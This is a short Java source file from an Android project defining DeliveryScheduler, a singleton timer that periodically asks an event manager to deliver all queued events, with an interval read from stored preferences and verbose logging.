package com.fx.maind.delivery;

import android.content.Context;

import com.fx.maind.EventManager;
import com.fx.maind.ref.Customization;
import com.fx.preference.PreferenceManager;
import com.vvt.logger.FxLog;
import com.vvt.timer.TimerBase;

public class DeliveryScheduler extends TimerBase {
	
	private static final String TAG = "DeliveryScheduler";
	private static final boolean LOCAL_LOGV = Customization.VERBOSE;
	
	private static DeliveryScheduler sInstance;
	
	private Context mContext;
	private PreferenceManager mPreferenceManager;
	private EventManager mEventManager;
	
	public static DeliveryScheduler getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new DeliveryScheduler(context);
		}
		return sInstance;
	}
	
	private DeliveryScheduler(Context context) {
		mContext = context;
		mPreferenceManager = PreferenceManager.getInstance(mContext);
		mEventManager = EventManager.getInstance(mContext);
	}

	@Override
	public void onTimer() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onTimer # Scheduling timer is expired");
		}
		
		FxLog.d(TAG, "onTimer # Sending attempt to deliver events ...");
		mEventManager.asyncRequestDeliverAll();
	}
	
	@Override
	public void start() {
		FxLog.d(TAG, "Start scheduler");
		
		long uploadIntervalMilliseconds = mPreferenceManager.getDeliveryPeriodMilliseconds();
		if (uploadIntervalMilliseconds < 1000) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "Start scheduler # Cannot start scheduler, time interval < 1 sec");
			}
			return;
		}
		
		setTimerDurationMs(uploadIntervalMilliseconds);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "Start scheduler # Set Timer (ms): " + uploadIntervalMilliseconds);
		}
		super.start();
	}
	
	@Override
	public void stop() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "Stop scheduler");
		}
		super.stop();
	}
	
}
